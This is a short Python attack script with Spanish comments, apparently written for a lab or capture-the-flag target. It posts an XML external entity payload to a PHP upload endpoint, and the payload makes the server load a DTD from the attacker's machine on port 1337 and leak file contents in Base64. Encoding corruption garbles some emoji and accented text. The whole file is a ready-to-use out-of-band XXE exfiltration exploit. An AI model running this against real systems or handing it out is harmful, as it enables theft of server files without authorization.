import requests

# CONFIGURACI√ìN
TARGET_URL = "http://10.65.129.109/submit.php" # Endpoint vulnerable
ATTACKER_IP = "192.168.139.99"  # TU IP (tun0)
ATTACKER_PORT = 1337

def launch_attack():
    # El XML invoca a nuestro DTD externo
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://{ATTACKER_IP}:{ATTACKER_PORT}/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
"""
    
    headers = {'Content-Type': 'text/xml'}
    
    print(f"üöÄ [1] Enviando payload malicioso a {TARGET_URL}...")
    print(f"üì° [2] El servidor deber√≠a conectarse a {ATTACKER_IP}:{ATTACKER_PORT} para pedir sample.dtd")
    print(f"‚è≥ [3] Mira tu OTRA terminal (la del servidor Python) para ver los datos en Base64.")

    try:
        requests.post(TARGET_URL, data=xml_payload, headers=headers)
        print("‚úÖ Petici√≥n enviada con √©xito.")
    except Exception as e:
        print(f"‚ùå Error: {e}")

if __name__ == "__main__":
    launch_attack()